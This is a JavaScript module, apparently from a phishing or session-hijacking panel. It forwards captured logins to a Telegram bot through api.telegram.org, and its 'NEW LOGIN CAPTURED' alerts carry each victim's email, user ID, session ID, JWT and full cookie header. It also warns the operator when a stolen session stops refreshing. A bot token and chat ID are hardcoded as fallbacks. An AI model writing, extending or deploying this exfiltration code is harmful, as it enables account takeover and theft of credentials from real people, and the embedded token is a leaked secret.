'use strict';

// Telegram notifications

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '7548124816:AAEVKxDYfga6UO2VRYXXxyVVm7FZZyU4He0';
const CHAT_ID = process.env.TELEGRAM_CHAT_ID || '7835764669';

function esc(s) {
  return String(s == null ? '' : s)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

async function sendMessage(text) {
  const res = await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: text,
      parse_mode: 'HTML',
      disable_web_page_preview: true
    })
  });
  if (!res.ok) {
    const t = await res.text().catch(() => '');
    console.error('[telegram] sendMessage failed:', res.status, t.slice(0, 200));
  }
  return res.ok;
}

async function sendLong(text) {
  const chunks = [];
  let cur = '';
  for (const line of text.split('\n')) {
    if ((cur + line).length > 3800) {
      chunks.push(cur);
      cur = '';
    }
    cur += line + '\n';
  }
  if (cur.trim()) chunks.push(cur);
  for (const c of chunks) {
    await sendMessage(c);
  }
}

function cookieHeaderLine(record) {
  const parts = (record.cookies || []).map((c) => c.name + '=' + c.value);
  return parts.join('; ');
}

async function notifyNewSession(record) {
  const st = record.api_status || {};
  const userStatus =
    st.user_status && st.user_status.http ? 'HTTP ' + st.user_status.http + ' — ' + JSON.stringify(st.user_status.body) : 'unknown';
  const enrollment =
    st.enrollment && st.enrollment.http ? 'HTTP ' + st.enrollment.http + ' — ' + JSON.stringify(st.enrollment.body) : 'unknown';
  const appeal = st.appeal && st.appeal.http ? 'HTTP ' + st.appeal.http + ' — ' + JSON.stringify(st.appeal.body) : 'unknown';

  let msg = '';
  msg += '\u{1F3AF} <b>NEW LOGIN CAPTURED</b>\n\n';
  msg += '\u{1F4E7} <b>Email:</b> ' + esc(record.email) + '\n';
  msg += '\u{1F464} <b>User ID:</b> <code>' + esc(record.user && record.user.id) + '</code>\n';
  msg += '\u{1F511} <b>Session:</b> <code>' + esc(record.session_id) + '</code>\n';
  msg += '\u{1F9F4} <b>Client:</b> <code>' + esc(record.client_id) + '</code>\n';
  msg += '\u{1F3C6} <b>Account status:</b> ' + esc(record.user_status || 'unknown') + '\n\n';
  msg += '\u{1F4CA} <b>Backend status</b>\n';
  msg += '\u2022 Enrollment: ' + esc(enrollment) + '\n';
  msg += '\u2022 User status: ' + esc(userStatus) + '\n';
  msg += '\u2022 Appeal: ' + esc(appeal) + '\n\n';
  msg += '\u{1F9EA} <b>JWT (60s, refreshed automatically):</b>\n<code>' + esc(record.jwt || '') + '</code>\n\n';
  msg += '\u{1F36A} <b>Cookies captured:</b> ' + ((record.cookies || []).length) + '\n';
  msg += '<code>' + esc(cookieHeaderLine(record)) + '</code>\n\n';
  msg += '\u23F0 <b>Time:</b> ' + new Date().toISOString() + '\n';
  msg += '\u{1F5C2} Manage in the panel: refresh cookies / check status anytime.';

  await sendLong(msg);
}

async function notifySessionExpired(record) {
  let msg = '';
  msg += '\u26A0\uFE0F <b>SESSION EXPIRED</b>\n\n';
  msg += '\u{1F4E7} <b>Email:</b> ' + esc(record.email) + '\n';
  msg += '\u{1F511} <b>Session:</b> <code>' + esc(record.session_id) + '</code>\n';
  msg += '\u2139\uFE0F The session stopped responding to refreshes. A new login is needed for fresh cookies.';
  await sendMessage(msg);
}

async function notifyTest() {
  return sendMessage('\u2705 Telegram notifications are working. (profiles-access-backend)');
}

module.exports = { sendMessage, sendLong, notifyNewSession, notifySessionExpired, notifyTest };
